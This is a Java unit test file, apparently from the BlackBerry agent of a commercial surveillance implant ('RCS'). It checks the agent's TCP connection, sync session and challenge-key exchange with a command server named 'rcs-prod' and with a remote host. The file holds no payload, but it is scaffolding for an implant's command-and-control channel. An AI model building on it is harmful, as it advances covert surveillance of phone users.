/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : tests.unit
 * File         : UT_Sync.java
 * Created      : 28-apr-2010
 * *************************************************/
package tests.unit;

import java.io.IOException;

import tests.AssertException;
import tests.TestUnit;
import tests.Tests;
import tests.accessor.TransferAccessor;
import blackberry.config.Keys;
import blackberry.transfer.DirectTcpConnection;
import blackberry.transfer.ProtocolException;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class UT_Sync.
 */
public final class UT_Sync extends TestUnit {

    //#debug
    static Debug debug = new Debug("UT_Sync", DebugLevel.VERBOSE);

    String host = "rcs-prod";
    //String host = "192.168.1.149";
    int port = 80;

    TransferAccessor transfer;

    boolean remoteTest = false;

    /**
     * Instantiates a new u t_ sync.
     * 
     * @param name
     *            the name
     * @param tests
     *            the tests
     */
    public UT_Sync(final String name, final Tests tests) {
        super(name, tests);
        transfer = new TransferAccessor();
    }

    private void ConnectionRemoteTest() throws AssertException {
        //#debug info
        debug.info("- ConnectionRemoteTest -");
        final String remoteHost = "iperbole.suppose.it";
        port = 8080;
        final DirectTcpConnection connection = new DirectTcpConnection(
                remoteHost, port, false, false);
        final boolean connected = connection.connect();
        AssertThat(connected, "not connected");

        try {
            //#debug debug
            debug.trace("send");
            // connection.send("HelloWorld".getBytes());
            final boolean ret = connection.send(Keys.getInstance()
                    .getChallengeKey());
            AssertThat(ret, "cannot send");
            //#debug debug
            debug.trace("receive");
            final byte[] rec = connection.receive(5);
            final String string = new String(rec);
            //#debug debug
            debug.trace("Received: " + string);
        } catch (final IOException e) {
            //#debug
            debug.error(e.toString());
        }

        connection.disconnect();
    }

    private void ConnectionTest() throws AssertException {
        //#debug info
        debug.info("- ConnectionTest -");
        final DirectTcpConnection connection = new DirectTcpConnection(host,
                port, false, false);
        final boolean connected = connection.connect();
        AssertThat(connected, "not connected");

        connection.disconnect();
    }

    /*
     * (non-Javadoc)
     * @see tests.TestUnit#run()
     */
    public boolean run() throws AssertException {
        ConnectionTest();
        Utils.sleep(2000);

        if (remoteTest) {
            ConnectionRemoteTest();
            Utils.sleep(2000);
        }

        SyncTest();
        Utils.sleep(2000);

        TransferTest();
        Utils.sleep(2000);

        //TransferSecureTest();
        //Utils.sleep(1000);
        return true;
    }

    private void SyncTest() throws AssertException {
        //#debug info
        debug.info("- SyncTest -");
        transfer.init(host, port, false, false);

        //#debug info
        debug.info("transfer sending");
        final boolean ret = transfer.startSession();
        AssertThat(ret == true, "Doesn't send transfer");

    }

    private void TransferSecureTest() throws AssertException {
        //#debug info
        debug.info("- TransferSecureTest -");
        transfer.init(host, 443, true, false);
        try {
            transfer.ChallengeTest();
        } catch (final ProtocolException e) {
            //#debug
            debug.error("Protocol exception: " + e);
            throw new AssertException();
        }
    }

    private void TransferTest() throws AssertException {
        //#debug info
        debug.info("- TransferTest -");
        transfer.init(host, port, false, false);
        try {
            transfer.ChallengeTest();
        } catch (final ProtocolException e) {
            //#debug
            debug.error("Protocol exception: " + e);
            throw new AssertException();
        }
    }

}
